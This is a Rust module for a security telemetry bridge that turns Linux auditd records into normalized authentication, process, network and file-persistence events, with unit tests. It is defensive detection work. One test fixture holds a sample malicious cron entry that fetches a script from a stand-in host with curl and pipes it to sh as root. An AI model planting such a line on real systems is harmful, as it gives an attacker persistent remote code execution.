use crate::host_common::{
    first_command_line, first_string, process_name_from_path, required_string, required_timestamp,
    required_u16, sanitize_optional_string, telemetry_event_id,
};
use crate::{JsonBridgeConfigError, validate_event_schema};
use async_trait::async_trait;
use serde_json::Value;
use swarm_core::config::AuditdBridgeConfig;
use swarm_core::{
    AuthenticationEventData, BridgeHealth, FilePersistenceEvent, NetworkConnectEvent,
    ProcessStartEvent, TelemetryBridge, TelemetryBridgeError, TelemetryBridgeResult,
    TelemetryEvent, TelemetryPayload,
};

use crate::source::JsonRecordSource;

const SOURCE_ID: &str = "auditd";

#[derive(Debug)]
pub struct AuditdBridge {
    source: JsonRecordSource,
    health: BridgeHealth,
}

impl AuditdBridge {
    pub fn new(source: JsonRecordSource) -> Self {
        Self {
            source,
            health: BridgeHealth::new(SOURCE_ID),
        }
    }

    pub fn from_config(config: &AuditdBridgeConfig) -> Result<Self, JsonBridgeConfigError> {
        let source = JsonRecordSource::from_file_config(&config.source)?;
        Ok(Self::new(source))
    }

    fn map_record(&mut self, record: &Value) -> TelemetryBridgeResult<Option<TelemetryEvent>> {
        let record_type = required_string(
            record,
            &["/type", "/record_type"],
            "type",
            &mut self.health,
            SOURCE_ID,
        )?;
        let timestamp = required_timestamp(
            record,
            &["/@timestamp", "/timestamp", "/time"],
            "timestamp",
            &mut self.health,
            SOURCE_ID,
        )?;
        let host_id = sanitize_optional_string(first_string(
            record,
            &["/host", "/hostname", "/node", "/agent/hostname"],
        ));
        let record_id = first_string(record, &["/serial", "/sequence", "/id"]);
        let syscall = first_string(record, &["/syscall"]);

        let payload = if is_auth_record(&record_type) {
            Some(self.map_authentication(record, host_id.as_deref())?)
        } else if syscall.as_deref() == Some("execve") || record_type.eq_ignore_ascii_case("EXECVE")
        {
            Some(self.map_process_start(record)?)
        } else if syscall
            .as_deref()
            .is_some_and(|value| matches!(value, "connect" | "sendto"))
        {
            Some(self.map_network_connect(record)?)
        } else if let Some(syscall_name) = syscall
            .as_deref()
            .filter(|value| matches!(*value, "open" | "openat" | "creat" | "rename" | "renameat"))
        {
            Some(self.map_file_persistence(record, syscall_name)?)
        } else {
            None
        };

        let Some(payload) = payload else {
            return Ok(None);
        };

        let event = TelemetryEvent {
            source: SOURCE_ID.to_string(),
            event_id: telemetry_event_id(
                SOURCE_ID,
                record_id,
                syscall.as_deref().unwrap_or(record_type.as_str()),
                timestamp,
            ),
            timestamp,
            host_id,
            payload,
        };

        if !validate_event_schema(&event, SOURCE_ID) {
            let message = format!(
                "bridge `{SOURCE_ID}` produced invalid normalized telemetry for `{}`",
                event.event_id
            );
            self.health.record_error(message.clone());
            return Err(TelemetryBridgeError::Schema(message));
        }

        Ok(Some(event))
    }

    fn map_authentication(
        &mut self,
        record: &Value,
        host_id: Option<&str>,
    ) -> TelemetryBridgeResult<TelemetryPayload> {
        let process_name = sanitize_optional_string(
            first_string(record, &["/exe", "/comm"]).map(|value| process_name_from_path(&value)),
        );
        let target_service = sanitize_optional_string(first_string(
            record,
            &["/service", "/terminal", "/exe", "/comm"],
        ))
        .map(|value| process_name_from_path(&value));
        let auth_type = infer_auth_type(target_service.as_deref(), process_name.as_deref());

        Ok(TelemetryPayload::AuthenticationEvent(
            AuthenticationEventData {
                auth_type,
                source_host: sanitize_optional_string(first_string(
                    record,
                    &["/addr", "/remote_addr", "/hostname"],
                )),
                target_host: host_id.map(str::to_string),
                target_service,
                process_name,
                success: auth_success(record),
                user: sanitize_optional_string(first_string(
                    record,
                    &["/acct", "/user", "/uid_name", "/auid_name"],
                )),
            },
        ))
    }

    fn map_process_start(&mut self, record: &Value) -> TelemetryBridgeResult<TelemetryPayload> {
        let exe = required_string(
            record,
            &["/exe", "/process/exe"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;
        let parent = required_string(
            record,
            &[
                "/parent_comm",
                "/ppcomm",
                "/process/parent_comm",
                "/parent_exe",
            ],
            "parent_comm",
            &mut self.health,
            SOURCE_ID,
        )?;
        let command_line = sanitize_optional_string(first_command_line(
            record,
            &["/cmdline", "/proctitle", "/argv"],
        ))
        .unwrap_or_else(|| exe.clone());

        Ok(TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: process_name_from_path(&parent),
            process_name: sanitize_optional_string(first_string(record, &["/comm"]))
                .unwrap_or_else(|| process_name_from_path(&exe)),
            command_line,
            user: sanitize_optional_string(first_string(
                record,
                &["/acct", "/user", "/uid_name", "/auid_name"],
            )),
            executable_path: Some(exe),
            signer: None,
            signature_valid: None,
        }))
    }

    fn map_network_connect(&mut self, record: &Value) -> TelemetryBridgeResult<TelemetryPayload> {
        let exe = required_string(
            record,
            &["/exe", "/comm"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;

        Ok(TelemetryPayload::NetworkConnect(NetworkConnectEvent {
            process_name: process_name_from_path(&exe),
            destination_ip: required_string(
                record,
                &["/addr", "/socket/addr", "/network/destination_ip"],
                "addr",
                &mut self.health,
                SOURCE_ID,
            )?,
            destination_port: required_u16(
                record,
                &["/port", "/socket/port", "/network/destination_port"],
                "port",
                &mut self.health,
                SOURCE_ID,
            )?,
            protocol: required_string(
                record,
                &["/proto", "/socket/proto", "/network/protocol"],
                "proto",
                &mut self.health,
                SOURCE_ID,
            )?
            .to_ascii_lowercase(),
        }))
    }

    fn map_file_persistence(
        &mut self,
        record: &Value,
        syscall: &str,
    ) -> TelemetryBridgeResult<TelemetryPayload> {
        let exe = required_string(
            record,
            &["/exe", "/comm"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;

        Ok(TelemetryPayload::FilePersistence(FilePersistenceEvent {
            file_path: required_string(
                record,
                &["/path", "/file/path", "/name"],
                "path",
                &mut self.health,
                SOURCE_ID,
            )?,
            operation: match syscall {
                "rename" | "renameat" => "rename",
                "creat" => "create",
                _ => "write",
            }
            .to_string(),
            process_name: process_name_from_path(&exe),
            content_preview: sanitize_optional_string(first_string(
                record,
                &["/content_preview", "/data", "/cmdline"],
            )),
        }))
    }
}

#[async_trait]
impl TelemetryBridge for AuditdBridge {
    fn source_id(&self) -> &str {
        SOURCE_ID
    }

    async fn poll(&mut self) -> TelemetryBridgeResult<Vec<TelemetryEvent>> {
        while let Some(record) = self.source.next_record() {
            if let Some(event) = self.map_record(&record)? {
                self.health.record_event(event.timestamp);
                return Ok(vec![event]);
            }
        }
        Ok(Vec::new())
    }

    fn validate_schema(&self, event: &TelemetryEvent) -> bool {
        validate_event_schema(event, SOURCE_ID)
    }

    fn health(&self) -> BridgeHealth {
        self.health.clone()
    }
}

fn is_auth_record(record_type: &str) -> bool {
    matches!(
        record_type,
        "USER_AUTH" | "USER_LOGIN" | "USER_ACCT" | "USER_START"
    )
}

fn auth_success(record: &Value) -> bool {
    if let Some(value) = first_string(record, &["/success"]) {
        let trimmed = value.trim();
        if trimmed == "0"
            || trimmed.eq_ignore_ascii_case("no")
            || trimmed.eq_ignore_ascii_case("false")
        {
            return false;
        }
        if trimmed == "1"
            || trimmed.eq_ignore_ascii_case("yes")
            || trimmed.eq_ignore_ascii_case("true")
        {
            return true;
        }
    }

    sanitize_optional_string(first_string(record, &["/res", "/result"])).is_none_or(|value| {
        value.eq_ignore_ascii_case("success") || value.eq_ignore_ascii_case("yes")
    })
}

fn infer_auth_type(target_service: Option<&str>, process_name: Option<&str>) -> String {
    let target_service = target_service.unwrap_or_default().to_ascii_lowercase();
    let process_name = process_name.unwrap_or_default().to_ascii_lowercase();
    if target_service.contains("ssh") || process_name.contains("ssh") {
        "ssh".to_string()
    } else if target_service.contains("sudo") || process_name.contains("sudo") {
        "sudo".to_string()
    } else if target_service.contains("login") || process_name.contains("login") {
        "login".to_string()
    } else {
        "pam".to_string()
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used)]
mod tests {
    use super::AuditdBridge;
    use crate::source::JsonRecordSource;
    use serde_json::json;
    use swarm_core::{TelemetryBridge, TelemetryPayload};

    #[tokio::test]
    async fn ssh_auth_maps_to_authentication_event() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "USER_AUTH",
            "serial": 420,
            "timestamp": "2026-04-13T15:20:00Z",
            "host": "linux-a",
            "acct": "alice",
            "exe": "/usr/sbin/sshd",
            "addr": "198.51.100.30",
            "res": "success"
        })]));

        let events = bridge.poll().await.expect("auditd auth event should map");
        let event = events.first().expect("one event should be returned");

        match &event.payload {
            TelemetryPayload::AuthenticationEvent(auth) => {
                assert_eq!(auth.auth_type, "ssh");
                assert_eq!(auth.source_host.as_deref(), Some("198.51.100.30"));
                assert_eq!(auth.target_host.as_deref(), Some("linux-a"));
                assert_eq!(auth.process_name.as_deref(), Some("sshd"));
                assert!(auth.success);
                assert_eq!(auth.user.as_deref(), Some("alice"));
            }
            _ => panic!("expected authentication payload"),
        }
    }

    #[tokio::test]
    async fn execve_maps_to_process_start() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "SYSCALL",
            "serial": 421,
            "timestamp": 1776093605.0,
            "host": "linux-a",
            "syscall": "execve",
            "exe": "/usr/bin/python3",
            "comm": "python3",
            "parent_comm": "systemd",
            "cmdline": "python3 -c import os",
            "acct": "svc-app"
        })]));

        let events = bridge.poll().await.expect("auditd execve event should map");
        let event = events.first().expect("one event should be returned");

        match &event.payload {
            TelemetryPayload::ProcessStart(process) => {
                assert_eq!(process.parent_process, "systemd");
                assert_eq!(process.process_name, "python3");
                assert_eq!(process.command_line, "python3 -c import os");
                assert_eq!(process.user.as_deref(), Some("svc-app"));
            }
            _ => panic!("expected process_start payload"),
        }
    }

    #[tokio::test]
    async fn syscall_connect_and_file_write_map_to_shared_schema() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([
            json!({
                "type": "SYSCALL",
                "serial": 422,
                "timestamp": "2026-04-13T15:20:10Z",
                "host": "linux-a",
                "syscall": "connect",
                "exe": "/usr/bin/curl",
                "comm": "curl",
                "addr": "203.0.113.40",
                "port": 443,
                "proto": "tcp"
            }),
            json!({
                "type": "SYSCALL",
                "serial": 423,
                "timestamp": "audit(1776093615.000:423)",
                "host": "linux-a",
                "syscall": "openat",
                "exe": "/bin/bash",
                "comm": "bash",
                "path": "/etc/cron.d/evil",
                "content_preview": "* * * * * root /usr/bin/curl https://example.invalid/a.sh | sh"
            }),
        ]));

        let network_event = bridge
            .poll()
            .await
            .expect("auditd connect event should map")
            .pop()
            .expect("network event should be returned");
        match network_event.payload {
            TelemetryPayload::NetworkConnect(connect) => {
                assert_eq!(connect.process_name, "curl");
                assert_eq!(connect.destination_ip, "203.0.113.40");
                assert_eq!(connect.destination_port, 443);
            }
            _ => panic!("expected network_connect payload"),
        }

        let file_event = bridge
            .poll()
            .await
            .expect("auditd file event should map")
            .pop()
            .expect("file event should be returned");
        match file_event.payload {
            TelemetryPayload::FilePersistence(file) => {
                assert_eq!(file.file_path, "/etc/cron.d/evil");
                assert_eq!(file.operation, "write");
                assert_eq!(file.process_name, "bash");
                assert!(file.content_preview.unwrap().contains("curl"));
            }
            _ => panic!("expected file_persistence payload"),
        }
    }
}
